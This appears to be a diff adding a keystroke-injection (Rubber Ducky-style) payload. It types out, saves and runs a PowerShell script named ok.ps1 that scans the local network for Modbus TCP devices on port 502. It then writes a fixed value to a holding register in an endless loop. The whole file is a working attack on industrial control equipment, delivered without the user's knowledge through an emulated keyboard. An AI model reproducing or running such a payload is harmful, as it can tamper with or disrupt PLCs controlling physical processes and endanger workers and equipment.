@@ -1,0 +1,172 @@
+DELAY 1000
+GUI r
+DELAY 100
+STRING notepad
+ENTER
+DELAY 1000
+STRING $a = Get-NetIPAddress -InterfaceAlias Ethernet
+DELAY 100
+ENTER
+STRING $a = $a -split ' '
+DELAY 100
+ENTER
+STRING $a = $a[1]
+DELAY 100
+ENTER
+STRING $a = $a[0..10]
+DELAY 100
+ENTER
+STRING $a = -join $a
+DELAY 100
+ENTER
+STRING $x = arp -a
+DELAY 100
+ENTER
+STRING $x = $x | Select-String 'dynamic'
+DELAY 100
+ENTER
+STRING $x = $x | Select-String $a
+DELAY 100
+ENTER
+STRING $x = $x -split ' ' | Select-String $a
+DELAY 100
+ENTER
+STRING foreach ($ip in $x){if((Test-NetConnection -Computername $ip -Port 502 -WarningAction SilentlyContinue).TcpTestSucceeded){$cn = $ip}
+DELAY 100
+ENTER
+STRING else {$dcn = $ip}}
+DELAY 100
+ENTER
+STRING enum ModbusFunction {WriteSingleRegister = [byte]0x06}
+DELAY 100
+ENTER
+STRING function Send-ModbusCommand {param ([Parameter(Mandatory=$true)][ModbusFunction]$Function,[Parameter(Mandatory=$true)][string]$Address,[Parameter(Mandatory=$true)][uint16]$Port,[Parameter(Mandatory=$true)][uint16]$Reference,[Parameter(Mandatory=$true)][uint16[]]$Payload,[byte]$Slave = 1)
+DELAY 100
+ENTER
+STRING $ReferenceBytes = [System.BitConverter]::GetBytes($Reference)
+DELAY 100
+ENTER
+STRING [array]::Reverse($ReferenceBytes)
+DELAY 100
+ENTER
+STRING [byte[]]$PayloadBytes = @(0) * ($Payload.Length * 2)
+DELAY 100
+ENTER
+STRING for ($i = 0; $i -lt $Payload.Length; $i++){
+DELAY 100
+ENTER
+STRING $p = $Payload[$i]
+DELAY 100
+ENTER
+STRING $pBytes = [System.BitConverter]::GetBytes($p)
+DELAY 100
+ENTER
+STRING [array]::Reverse($pBytes)
+DELAY 100
+ENTER
+STRING [array]::Copy($pBytes, 0, $PayloadBytes, $i *2, 2)}
+DELAY 100
+ENTER
+STRING [byte[]]$tail = $Slave, $Function
+DELAY 100
+ENTER
+STRING $tail += $ReferenceBytes
+DELAY 100
+ENTER
+STRING if ($PayloadBytes.Length -gt 0){$tail += $PayloadBytes}
+DELAY 100
+ENTER
+STRING [uint16]$length = $tail.Length
+DELAY 100
+ENTER
+STRING $lengthBytes = [System.BitConverter]::GetBytes($length)
+DELAY 100
+ENTER
+STRING [array]::Reverse($lengthBytes)
+DELAY 100
+ENTER
+STRING [byte[]]$data = 0x00, 0x01, 0x00, 0x00
+DELAY 100
+ENTER
+STRING $data += $lengthBytes
+DELAY 100
+ENTER
+STRING $data += $tail
+DELAY 100
+ENTER
+STRING [byte[]] $buffer = @(0) * 1024
+DELAY 100
+ENTER
+STRING $tcpConnection = New-Object System.Net.Sockets.TcpClient($Address, $Port)
+DELAY 100
+ENTER
+STRING $tcpConnection.ReceiveTimeout = 5000
+DELAY 100
+ENTER
+STRING $tcpStream = $tcpConnection.GetStream()
+DELAY 100
+ENTER
+STRING $tcpStream.Write($data,0,$data.length)
+DELAY 100
+ENTER
+STRING $tcpStream.Flush()
+DELAY 100
+ENTER
+STRING $size = $tcpStream.Read($buffer,0,$buffer.length)
+DELAY 100
+ENTER
+STRING $result = @(0) * $size
+DELAY 100
+ENTER
+STRING [array]::copy($buffer,$result,$size)
+DELAY 100
+ENTER
+STRING $tcpConnection.Close()
+DELAY 100
+ENTER
+STRING return $result}
+DELAY 100
+ENTER
+STRING function Write-SingleRegister {param ([Parameter(Mandatory=$true)][string]$Address,[Parameter(Mandatory=$true)][uint16]$Port,[Parameter(Mandatory=$true)][uint16]$Reference,[Parameter(Mandatory=$true)][uint16]$Data,[byte]$Slave = 1)
+DELAY 100
+ENTER
+STRING $result = Send-ModbusCommand WriteSingleRegister $Address $Port $Reference @($Data) $Slave}
+DELAY 100
+ENTER
+STRING $Address = $cn
+DELAY 100
+ENTER
+STRING $Port = 502
+DELAY 100
+ENTER
+STRING $Reference = 1
+DELAY 100
+ENTER
+STRING $Data = 0x0100
+DELAY 100
+ENTER
+STRING $Num = 8
+DELAY 100
+ENTER
+STRING while ($true){Write-SingleRegister -Address $Address -Port $Port -Reference $Reference -Data $Data}
+DELAY 100
+ENTER
+DELAY 1000
+CTRL s
+DELAY 1000
+STRING ok.ps1
+DELAY 2000
+ENTER
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 2000
+ENTER
+DELAY 3000
+STRING cd Documents
+DELAY 1000
+ENTER
+STRING .\ok.ps1
+DELAY 1000
+ENTER
